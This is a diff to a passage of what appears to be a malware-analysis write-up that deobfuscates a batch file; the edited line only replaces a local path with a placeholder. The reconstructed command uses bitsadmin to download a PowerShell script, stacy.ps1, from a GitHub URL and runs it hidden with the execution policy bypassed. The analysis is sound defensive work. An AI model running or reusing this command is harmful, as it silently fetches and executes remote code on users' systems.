@@ -104,7 +104,7 @@ The very last line of the script suggest that the full command being constructed
 Using the same techniques from the sections before to reconstruct the command executed by this batch file.
 
 ```batch
-bitsadmin.exe /transfer "f48920e537d9c4e0e795971da3646444190eecd24d719303becdd9a13bfa5810" https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1 cd\stacy.ps1 && powershell.exe -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND cd\stacy.ps1
+bitsadmin.exe /transfer "f48920e537d9c4e0e795971da3646444190eecd24d719303becdd9a13bfa5810" https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1 C:\path\to\stacy.ps1 && powershell.exe -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND "C:\path\to\stacy.ps1"
 ```
 
 As seen above, the command uses **bitsadmin** and **powershell** to download and execute a powershell script named **stacy.ps1**
